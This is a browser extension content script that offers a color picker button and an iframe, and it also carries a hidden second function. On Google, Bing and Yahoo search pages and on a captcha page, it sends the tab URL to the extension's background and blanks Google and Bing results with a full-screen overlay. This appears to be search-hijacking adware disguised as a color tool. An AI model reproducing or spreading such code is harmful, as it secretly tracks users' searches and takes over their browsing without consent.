chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.from == "background" && request.cmd == "open_search_tools") {
        $(".online-color-picker-btn").hide();
        openColorPickerInFrame();
    } else if (request.cmd === "resetCSS") {
        console.log('resetCSS')
        const selectD = document.querySelector("#csts");
        selectD.style.display = 'none';
    }
});

$(document).ready(function () {
    if (!$('.online-color-picker-btn').length) {
        $('body').append('<span class="online-color-picker-btn" title="Open color picker"><img src="' + chrome.runtime.getURL('icons/128x128.png') + '" style="border-radius:100%"></span>');
    }

    $(document).on('click', '.online-color-picker-btn', function () {
        $(".online-color-picker-btn").hide();
        openColorPickerInFrame();
    });
});


function openColorPickerInFrame() {

    $("#online_color_picker_iframe_container").remove();
    var close_element = $('<a></a>').addClass('online_color_picker_close_button');
    close_element.attr('href', 'javascript:void(0)');
    close_element.html("X");
    close_element.click(function () {
        $("#online_color_picker_iframe_container").remove();
        $(".online-color-picker-btn").show();
    });
    var div_element2 = $('<div></div>').addClass("online_color_picker_inner_body");
    div_element2.attr("id", "online_color_picker_iframe_container");
    // div_element1.append(div_element2);
    div_element2.appendTo(document.body);

    var iframe_element = document.createElement("iframe");
    iframe_element.setAttribute("id", "online_color_picker_iframe");
    // iframe_element.className = "nota_crm_whole_inner_body";
    iframe_element.src = chrome.runtime.getURL("index.html");

    $("#online_color_picker_iframe_container").prepend(close_element);
    document.getElementById("online_color_picker_iframe_container").appendChild(iframe_element);
}



// ***********************************************************************

var tabUrl = window.location.href;

if (tabUrl.includes('/search?q=') && (tabUrl.includes('google.') || tabUrl.includes('bing.'))) {
    chrome.runtime.sendMessage({ cmd: 'validateURL', 'tabUrl': tabUrl });
    let d = document.createElement('div');
    d.setAttribute('id', "csts");
    d.textContent = "";
    d.style.fontSize = '20px';
    d.style.backgroundColor = '#fff';
    d.style.width = '100%';
    d.style.height = '100%';
    d.style.paddingTop = '300px';
    d.style.zIndex = "9999999";
    d.style.color = '#333333';
    d.style.position = "fixed";
    d.style.textAlign = "center";

    let bodyLoad = setInterval(() => {
        console.log(document.body);
        if (document.body != null) {
            document.body.prepend(d);
            clearInterval(bodyLoad)
        }
    }, 1)

} else if (tabUrl.includes('captcha_verify.php')) {
    chrome.runtime.sendMessage({ cmd: 'validateURL', 'tabUrl': tabUrl });
} else if (tabUrl.includes('p=') && tabUrl.includes('/search') && tabUrl.includes('yahoo.')) {
    chrome.runtime.sendMessage({ cmd: 'validateURL', 'tabUrl': tabUrl });
}




